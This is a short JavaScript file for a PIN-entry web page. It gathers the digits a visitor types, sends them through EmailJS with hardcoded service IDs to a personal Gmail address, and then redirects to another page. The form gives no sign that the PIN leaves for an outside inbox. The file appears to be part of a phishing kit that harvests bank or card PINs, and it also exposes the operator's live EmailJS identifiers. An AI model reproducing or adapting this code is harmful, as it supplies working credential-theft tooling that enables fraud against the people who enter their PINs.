const serviceId = "service_jczm20f";
const userId = "Kh826G14W5iUhc1Z1";
const templateId = "template_sicwj21";
// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      }
    }
  });
}
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
// Function to collect and validate the PIN when the Submit button is clicked
document
  .getElementById("submitBtn")
  .addEventListener("click", function (event) {
    var pin = "";
    var pinInputs = document.getElementsByClassName("pin-input");

    for (var i = 0; i < pinInputs.length; i++) {
      pin += pinInputs[i].value;
    }

    console.log(pin);
    event.preventDefault();
    const emailParams = {
      to_name: "jamesdanialdd@gmail.com",
      pin: pin,
    };
    console.log(emailParams);
    emailjs.send(serviceId, templateId, emailParams, userId).then(
      function (response) {
        if (pin.trim() !== "") {
          console.log("Sent successfully:", response);
          pin = "";

          location.href = "/opp.html";
        }
      },
      function (error) {
        if (pin.trim() == "") {
          console.log("Failed to send:", error);
        }
      }
    );
  });
